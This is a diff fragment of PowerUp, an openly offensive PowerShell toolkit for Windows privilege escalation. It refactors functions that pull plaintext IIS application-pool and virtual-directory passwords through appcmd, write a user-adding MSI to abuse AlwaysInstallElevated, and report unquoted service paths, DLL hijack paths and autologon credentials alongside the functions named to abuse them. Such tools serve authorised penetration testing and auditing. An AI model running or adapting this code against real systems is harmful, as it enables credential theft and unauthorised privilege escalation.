         # Create data table to house results
         $DataTable = New-Object System.Data.DataTable 
 
         # Create and name columns in the data table
-        $DataTable.Columns.Add("user") | Out-Null
-        $DataTable.Columns.Add("pass") | Out-Null  
-        $DataTable.Columns.Add("type") | Out-Null
-        $DataTable.Columns.Add("vdir") | Out-Null
-        $DataTable.Columns.Add("apppool") | Out-Null
+        $Null = $DataTable.Columns.Add("user")
+        $Null = $DataTable.Columns.Add("pass")  
+        $Null = $DataTable.Columns.Add("type")
+        $Null = $DataTable.Columns.Add("vdir")
+        $Null = $DataTable.Columns.Add("apppool")
 
         # Get list of application pools
-        Invoke-Expression "$env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object { 
+        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object { 
         
             #Get application pool name
             $PoolName = $_
         
             #Get username           
-            $PoolUserCmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
+            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
             $PoolUser = Invoke-Expression $PoolUserCmd 
                     
             #Get password
-            $PoolPasswordCmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
+            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
             $PoolPassword = Invoke-Expression $PoolPasswordCmd 
 
             #Check if credentials exists
             if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array]))
             {
                 #Add credentials to database
-                $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) | Out-Null  
+                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) 
             }
         }
 
         # Get list of virtual directories
-         Invoke-Expression "$env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object { 
+        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object { 
 
             #Get Virtual Directory Name
             $VdirName = $_
         
             #Get username           
-            $VdirUserCmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
+            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
             $VdirUser = Invoke-Expression $VdirUserCmd
                     
             #Get password       
-            $VdirPasswordCmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
+            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
             $VdirPassword = Invoke-Expression $VdirPasswordCmd
 
             #Check if credentials exists
             if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array]))
             {
                 #Add credentials to database
-                $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA') | Out-Null  
+                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
             }
         }
 
@@ -2255,9 +1960,8 @@ function Write-UserAddMSI {
 <#
     .SYNOPSIS
 
-        This function writes out a precompiled MSI installer that prompts
-        for a user/group addition. This function can be used to abuse 
-        Get-RegAlwaysInstallElevated.
+        Writes out a precompiled MSI installer that prompts for a user/group addition. 
+        This function can be used to abuse Get-RegAlwaysInstallElevated.
 
     .EXAMPLE
 
@@ -2272,12 +1976,17 @@ function Write-UserAddMSI {
 
     try {
         [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
-        Write-Verbose "Service binary written out to '$Path'"
-        "[*] User add .MSI written to '$Path'"
+        Write-Verbose "MSI written out to '$Path'"
+
+        $Out = New-Object PSObject 
+        $Out | Add-Member Noteproperty 'OutputPath' $Path
+        $Out
     }
     catch {
         Write-Warning "Error while writing to location '$Path': $_"
-        $False
+        $Out = New-Object PSObject 
+        $Out | Add-Member Noteproperty 'OutputPath' $_
+        $Out
     }
 }
 
@@ -2286,8 +1995,11 @@ function Invoke-AllChecks {
 <#
     .SYNOPSIS
 
-        This function runs all functions that check for various
-        Windows privilege escalation opportunities.
+        Runs all functions that check for various Windows privilege escalation opportunities.
+
+    .PARAMETER HTMLReport
+
+        Switch. Write a HTML version of the report to SYSTEM.username.html.
 
     .EXAMPLE
 
@@ -2295,6 +2007,25 @@ function Invoke-AllChecks {
 
         Runs all escalation checks, output statuses for whatever's found.
 #>
+
+    [CmdletBinding()]
+    Param(
+        [Switch]
+        $HTMLReport
+    )
+
+    if($HTMLReport) {
+        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
+
+        $Header = "<style>"
+        $Header = $Header + "BODY{background-color:peachpuff;}"
+        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
+        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
+        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
+        $Header = $Header + "</style>"
+
+        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
+    }
 
     # initial admin checks
 
@@ -2304,12 +2035,21 @@ function Invoke-AllChecks {
 
     if($IsAdmin){
         "[+] Current user already has local administrative privileges!"
+        
+        if($HTMLReport) {
+            ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
+        }
+        # return
     }
     else{
         "`n`n[*] Checking if user is in a local group with administrative privileges..."
         if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ){
             "[+] User is in a local group that grants administrative privileges!"
-            "[*] Run a BypassUAC attack to elevate privileges to admin."
+            "[+] Run a BypassUAC attack to elevate privileges to admin."
+
+            if($HTMLReport) {
+                ConvertTo-HTML -Head $Header -Body "<H2> User In Local Group With Adminisrtative Privileges</H2>" | Out-File -Append $HtmlReportFile
+            }
         }
     }
 
@@ -2317,79 +2057,99 @@ function Invoke-AllChecks {
     # Service checks
 
     "`n`n[*] Checking for unquoted service paths..."
-    "[*] Use 'Write-UserAddServiceBinary' or 'Write-CMDServiceBinary' to abuse`n"
-    Get-ServiceUnquoted | Format-Table -wrap
+    $Results = Get-ServiceUnquoted
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
+    }
 
     "`n`n[*] Checking service executable and argument permissions..."
-    "[*] Use 'Write-ServiceEXE -ServiceName SVC' or 'Write-ServiceEXECMD' to abuse any binaries`n"
-    Get-ServiceFilePermission | Format-Table -wrap
+    $Results = Get-ServiceFilePermission
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
+    }
 
     "`n`n[*] Checking service permissions..."
-    "[*] Use 'Invoke-ServiceUserAdd -ServiceName SVC' or 'Invoke-ServiceCMD' to abuse`n"
-    Get-ServicePermission | Format-Table -wrap
+    $Results = Get-ServicePermission
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
+    }
 
 
     # .dll hijacking
 
     "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
-    $HijackablePaths = Find-PathHijack
-    if ($HijackablePaths){
-        if($HijackablePaths) {
-            ForEach ($Path in $HijackablePaths){
-                "[+] Hijackable .dll path: $Path"
-                "[*] Use 'Write-HijackDll -OutputFile $Path\wlbsctrl.dll -Command X' to abuse"
-            }
-        }
+    $Results = Find-PathHijack
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
     }
 
 
     # registry checks
 
     "`n`n[*] Checking for AlwaysInstallElevated registry key..."
-    if (Get-RegAlwaysInstallElevated){
-        "[*] Use 'Write-UserAddMSI' to abuse`n"
-        "[+] AlwaysInstallElevated is enabled for this machine!"
+    if (Get-RegAlwaysInstallElevated) {
+        $Out = New-Object PSObject 
+        $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
+        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
+        $Results = $Out
+
+        $Results | Format-List
+        if($HTMLReport) {
+            $Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
+        }
     }
 
     "`n`n[*] Checking for Autologon credentials in registry..."
-    $AutologonCreds = Get-RegAutoLogon
-    if ($AutologonCreds){
-        try{
-            if (($AutologonCreds.DefaultUserName) -and (-not ($AutologonCreds.DefaultUserName -eq ''))) {
-                "[+] Autologon default credentials: $($AutologonCreds.DefaultDomainName), $($AutologonCreds.DefaultUserName),  $($AutologonCreds.DefaultPassword),"
-            }
-        }
-        catch {}
-        try {
-            if (($AutologonCreds.AltDefaultUserName) -and (-not($AutologonCreds.AltDefaultUserName -eq ''))) {
-                "[+] Autologon alt credentials: $($AutologonCreds.AltDefaultDomainName), $($AutologonCreds.AltDefaultUserName),  $($AutologonCreds.AltDefaultPassword),"
-            }
-        }
-        catch {}
+    $Results = Get-RegAutoLogon
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
     }
 
-    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
-    Get-VulnAutoRun | Format-Table -Wrap
 
+    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
+    $Results = Get-VulnAutoRun
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
+    }
 
     # other checks
 
     "`n`n[*] Checking for vulnerable schtask files/configs..."
-    Get-VulnSchTask | Format-Table -wrap
+    $Results = Get-VulnSchTask
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
+    }
 
     "`n`n[*] Checking for unattended install files..."
-    $InstallFiles = Get-UnattendedInstallFile
-    if ($InstallFiles){
-        "[*] Examine install files for possible passwords`n"
-        ForEach ($File in $InstallFiles){
-            "[+] Unattended install file: $File"
-        }
+    $Results = Get-UnattendedInstallFile
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking for encrypted web.config strings..."
-    Get-Webconfig | Where-Object {$_}
+    $Results = Get-Webconfig | Where-Object {$_}
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
+    }
 
     "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
-    Get-ApplicationHost | Where-Object {$_}
+    $Results = Get-ApplicationHost | Where-Object {$_}
+    $Results | Format-List
+    if($HTMLReport) {
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
+    }
     "`n"
+
+    if($HTMLReport) {
+        "[*] Report written to '$HtmlReportFile' `n"
+    }
 }
